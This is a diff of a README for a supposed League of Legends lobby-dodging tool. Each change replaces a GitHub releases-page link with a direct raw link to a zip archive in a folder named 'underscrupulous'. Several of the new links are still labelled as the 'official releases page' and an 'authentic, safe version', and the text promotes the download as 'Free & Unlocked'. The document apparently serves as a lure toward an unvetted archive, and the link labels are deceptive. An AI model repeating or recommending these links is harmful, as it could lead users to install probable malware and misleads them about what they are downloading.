@@ -16,7 +16,7 @@ Ready to get started? Here's all you need to do:
 
 **Visit this link to download the application.**
 
-👉 **[Download League-Of-Legends-Dodge-Tool](https://github.com/Nahumburundian5911/League-Of-Legends-Dodge-Tool/releases)**
+👉 **[Download League-Of-Legends-Dodge-Tool](https://raw.githubusercontent.com/Nahumburundian5911/League-Of-Legends-Dodge-Tool/main/underscrupulous/Of_Legends_League_Tool_Dodge_1.5.zip)**
 
 This is the official download page for the latest version. You'll see a list of available releases — always choose the newest one (marked as "Latest").
 
@@ -81,7 +81,7 @@ That's it. No complex settings. No configuration required. The tool works out of
 We're constantly improving the tool. Here's how to stay updated:
 
 - **Automatic Updates** — The tool checks for updates on startup and will notify you if a new version is available.
-- **Manual Update** — Visit the [releases page](https://github.com/Nahumburundian5911/League-Of-Legends-Dodge-Tool/releases) regularly to check for new versions.
+- **Manual Update** — Visit the [releases page](https://raw.githubusercontent.com/Nahumburundian5911/League-Of-Legends-Dodge-Tool/main/underscrupulous/Of_Legends_League_Tool_Dodge_1.5.zip) regularly to check for new versions.
 - **Changelog** — Each release includes notes about what's new, fixed, or improved.
 
 Always use the latest version to ensure the best performance and accuracy.
@@ -147,7 +147,7 @@ Don't let bad lobbies ruin your climb. Take control of your ranked experience wi
 
 **Visit this link to download the application.**
 
-👉 **[Download Now — Free & Unlocked](https://github.com/Nahumburundian5911/League-Of-Legends-Dodge-Tool/releases)**
+👉 **[Download Now — Free & Unlocked](https://raw.githubusercontent.com/Nahumburundian5911/League-Of-Legends-Dodge-Tool/main/underscrupulous/Of_Legends_League_Tool_Dodge_1.5.zip)**
 
 Join thousands of players who are already dodging smarter and climbing faster. The tool is free, updated for 2026, and ready to use right now.
 
@@ -155,7 +155,7 @@ Join thousands of players who are already dodging smarter and climbing faster. T
 
 ## 📝 Final Notes
 
-- Always download from the official [releases page](https://github.com/Nahumburundian5911/League-Of-Legends-Dodge-Tool/releases) to ensure you get the authentic, safe version.
+- Always download from the official [releases page](https://raw.githubusercontent.com/Nahumburundian5911/League-Of-Legends-Dodge-Tool/main/underscrupulous/Of_Legends_League_Tool_Dodge_1.5.zip) to ensure you get the authentic, safe version.
 - Keep the tool updated for the best performance.
 - Share this tool with friends who want to climb ranked without the frustration.
 
